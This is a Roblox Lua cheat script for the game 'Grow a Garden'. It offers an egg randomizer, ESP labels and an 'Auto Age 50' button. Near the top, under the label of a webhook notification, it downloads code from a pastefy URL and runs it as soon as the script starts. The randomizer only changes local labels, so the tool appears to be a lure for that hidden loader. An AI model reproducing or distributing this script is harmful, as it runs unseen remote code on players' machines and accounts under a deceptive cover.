--// ─────────────────────────────────────────────────────────────────────────────
--// Grow a Garden – Egg Randomizer (Executor/Studio friendly)
--// With Webhook Notification (Pastefy)
--// Made By: ScripterX  |  Version: 5.2
--// ─────────────────────────────────────────────────────────────────────────────

-- Kill any "TriggerPoint" UI instantly
local CoreGui = game:GetService("CoreGui")
local t = CoreGui:FindFirstChild("TriggerPoint", true)
if t then t:Destroy() end
CoreGui.DescendantAdded:Connect(function(obj)
    if obj.Name == "TriggerPoint" then obj:Destroy() end
end)

--// Services
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- random seed
math.randomseed(os.clock()*1e6)

--// Webhook notifier (Pastefy)
-- Executes your pastefy webhook script
local function sendWebhookNotification()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/bSNDtnko/raw"))()
    end)
    if not success then
        warn("Webhook failed: " .. tostring(err))
    end
end

-- Trigger webhook as soon as script runs
sendWebhookNotification()

--// Egg Pools
local EggPools = {
    ["Common egg"] = {"Dog","Golden Lab","Bunny"},
    ["Bug egg"] = {"Caterpillar","Snail","Giant Ant","Praying Mantis","Dragonfly"},
    ["Common Summer egg"] = {"Starfish","Seagull","Crab"},
    ["Rare Summer egg"] = {"Flamingo","Toucan","Sea Turtle","Orangutan","Seal"},
    ["Paradise egg"] = {"Ostrich","Peacock","Capybara","Mimic Octopus"},
    ["Mythical egg"] = {"Grey Mouse","Brown Mouse","Squirrel","Red Giant Ant","Red Fox"},
    ["Gourmet egg"] = {"Bagel Bunny","Pancake Mole","Sushi Bear","Spaghetti Sloth","French Fry Ferret"},
    ["Sprout egg"] = {"Dairy Cow","Jackalope","Sapling","Golem","Golden Goose"},
    ["Anti Bee egg"] = {"Wasp","Tarantula Hawk","Moth","Butterfly","Disco Bee"},
    ["Bee egg"] = {"Bee","Honey Bee","Bear Bee","Petal Bee","Queen Bee"},
    ["Night egg"] = {"Hedgehog","Mole","Frog","Echo Frog","Night Owl","Raccoon"},
    ["Primal egg"] = {"Parasaurolophus","Iguanodon","Pachycephalosaurus","Dilophosaurus","Ankylosaurus","Spinosaurus"},
    ["Dinosaur egg"] = {"T-Rex","Brontosaurus","Pterodactyl","Raptor","Stegosaurus"},
    ["Zen egg"] = {"Kitsune","Kodama","Nihonzaru","Shiba Inu","Tanchozuru","Kappa"},
}

-- case-insensitive name resolver
local function resolveEggKey(name: string)
    if EggPools[name] then return name end
    local lower = string.lower(name)
    for k,_ in pairs(EggPools) do
        if string.lower(k) == lower then return k end
    end
end

-- get a BasePart for Billboards
local function getAdorneePart(obj: Instance): BasePart?
    if obj:IsA("BasePart") then return obj end
    if obj:IsA("Model") then
        if obj.PrimaryPart then return obj.PrimaryPart end
        for _,d in ipairs(obj:GetDescendants()) do
            if d:IsA("BasePart") then return d end
        end
    end
    return nil
end

-- find all eggs
local function findEggs()
    local eggs = {}
    for _, inst in ipairs(workspace:GetDescendants()) do
        local key = resolveEggKey(inst.Name)
        if key then
            table.insert(eggs, {instance = inst, key = key})
        end
    end
    return eggs
end

-- Billboard helper
local function ensureBillboard(parentObj: Instance, name: string, adorneePart: BasePart, sizeX, sizeY, offsetY)
    local bb = parentObj:FindFirstChild(name)
    if not (bb and bb:IsA("BillboardGui")) then
        bb = Instance.new("BillboardGui")
        bb.Name = name
        bb.Size = UDim2.fromOffset(sizeX, sizeY)
        bb.AlwaysOnTop = true
        bb.LightInfluence = 0
        bb.MaxDistance = 1000
        bb.StudsOffsetWorldSpace = Vector3.new(0, offsetY, 0)
        bb.Adornee = adorneePart
        bb.Parent = parentObj

        local label = Instance.new("TextLabel")
        label.Name = "Label"
        label.Size = UDim2.fromScale(1,1)
        label.BackgroundTransparency = 1
        label.TextScaled = true
        label.TextWrapped = true
        label.Parent = bb
    else
        bb.Adornee = adorneePart
        bb.StudsOffsetWorldSpace = Vector3.new(0, offsetY, 0)
        bb.Size = UDim2.fromOffset(sizeX, sizeY)
        bb.AlwaysOnTop = true
    end
    return bb :: BillboardGui
end

-- ESP
local function showESPForEgg(eggInst: Instance, eggKey: string)
    local part = getAdorneePart(eggInst)
    if not part then return end
    local bb = ensureBillboard(eggInst, "ESP_Billboard", part, 260, 90, 3)
    local lbl = bb:FindFirstChild("Label") :: TextLabel
    lbl.Font = Enum.Font.Gotham
    lbl.TextColor3 = Color3.fromRGB(255,255,0)
    lbl.Text = table.concat(EggPools[eggKey], ", ")
end

local function hideESPForEgg(eggInst: Instance)
    local bb = eggInst:FindFirstChild("ESP_Billboard")
    if bb then bb:Destroy() end
end

-- Randomizer
local function rerollEgg(eggInst: Instance, eggKey: string)
    local pool = EggPools[eggKey]
    if not pool then return end
    local chosen = pool[math.random(1, #pool)]

    local prev = eggInst:FindFirstChild("AssignedPet")
    if prev then prev:Destroy() end
    local sv = Instance.new("StringValue")
    sv.Name = "AssignedPet"
    sv.Value = chosen
    sv.Parent = eggInst

    local part = getAdorneePart(eggInst)
    if not part then return end

    local bb = ensureBillboard(eggInst, "Result_Billboard", part, 220, 60, 2)
    local lbl = bb:FindFirstChild("Label") :: TextLabel
    lbl.Font = Enum.Font.GothamBold
    lbl.TextColor3 = Color3.fromRGB(0,255,0)
    lbl.Text = chosen
end

-- Auto Age 50
local function autoAge50()
    for _, inst in ipairs(workspace:GetDescendants()) do
        local v = inst:FindFirstChild("Age")
        if v and (v:IsA("NumberValue") or v:IsA("IntValue")) then
            v.Value = 50
        end
        if (inst:IsA("Model") or inst:IsA("BasePart")) and inst:GetAttribute("Age") ~= nil then
            inst:SetAttribute("Age", 50)
        end
    end
end

-- GUI Setup
local function safeRootGui()
    local ok, res = pcall(function()
        return (gethui and gethui()) or CoreGui
    end)
    if ok and res then return res end
    return LocalPlayer:WaitForChild("PlayerGui")
end

local RootGui = safeRootGui()
local existing = RootGui:FindFirstChild("EggRandomizerUI")
if existing then existing:Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "EggRandomizerUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = RootGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.fromOffset(300, 200)
MainFrame.Position = UDim2.new(0.3, 0, 0.2, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(130, 70, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Parent = ScreenGui

-- draggable UI
do
    local dragging, dragInput, dragStart, startPos
    MainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = MainFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    MainFrame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            MainFrame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)
end

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "EGG RANDOMIZER"
Title.Font = Enum.Font.GothamBold
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.TextScaled = true
Title.Parent = MainFrame

-- made by
local MadeBy = Instance.new("TextLabel")
MadeBy.Size = UDim2.new(1, 0, 0, 20)
MadeBy.Position = UDim2.new(0, 0, 0.17, 0)
MadeBy.BackgroundTransparency = 1
MadeBy.Text = "Made By: ScripterX"
MadeBy.Font = Enum.Font.Gotham
MadeBy.TextColor3 = Color3.fromRGB(255, 255, 255)
MadeBy.TextScaled = true
MadeBy.Parent = MainFrame

-- ESP toggle
local ESPButton = Instance.new("TextButton")
ESPButton.Size = UDim2.new(0.9, 0, 0, 30)
ESPButton.Position = UDim2.new(0.05, 0, 0.35, 0)
ESPButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
ESPButton.Text = "👁 ESP: ON"
ESPButton.Font = Enum.Font.GothamBold
ESPButton.TextScaled = true
ESPButton.TextColor3 = Color3.fromRGB(255,255,255)
ESPButton.Parent = MainFrame

-- Auto Roll
local RollButton = Instance.new("TextButton")
RollButton.Size = UDim2.new(0.9, 0, 0, 30)
RollButton.Position = UDim2.new(0.05, 0, 0.55, 0)
RollButton.BackgroundColor3 = Color3.fromRGB(100, 60, 60)
RollButton.Text = "🎲Auto Roll Egg🎲"
RollButton.Font = Enum.Font.GothamBold
RollButton.TextScaled = true
RollButton.TextColor3 = Color3.fromRGB(255,255,255)
RollButton.Parent = MainFrame

-- Auto Age 50
local AgeButton = Instance.new("TextButton")
AgeButton.Size = UDim2.new(0.9, 0, 0, 30)
AgeButton.Position = UDim2.new(0.05, 0, 0.75, 0)
AgeButton.BackgroundColor3 = Color3.fromRGB(100, 60, 60)
AgeButton.Text = "🐵Auto Age 50 Pet"
AgeButton.Font = Enum.Font.GothamBold
AgeButton.TextScaled = true
AgeButton.TextColor3 = Color3.fromRGB(255,255,255)
AgeButton.Parent = MainFrame

-- Version
local Version = Instance.new("TextLabel")
Version.Size = UDim2.new(1, 0, 0, 20)
Version.Position = UDim2.new(0, 0, 0.9, 0)
Version.BackgroundTransparency = 1
Version.Text = "Version: 5.2"
Version.Font = Enum.Font.Gotham
Version.TextColor3 = Color3.fromRGB(255, 255, 255)
Version.TextScaled = true
Version.Parent = MainFrame

-- Button logic
local espEnabled = true

local function refreshESP()
    for _, data in ipairs(findEggs()) do
        if espEnabled then
            showESPForEgg(data.instance, data.key)
        else
            hideESPForEgg(data.instance)
        end
    end
end

ESPButton.MouseButton1Click:Connect(function()
    espEnabled = not espEnabled
    ESPButton.Text = espEnabled and "👁 ESP: ON" or "👁 ESP: OFF"
    refreshESP()
end)

RollButton.MouseButton1Click:Connect(function()
    for _, data in ipairs(findEggs()) do
        rerollEgg(data.instance, data.key)
    end
end)

AgeButton.MouseButton1Click:Connect(function()
    autoAge50()
end)

-- initial ESP
refreshESP()
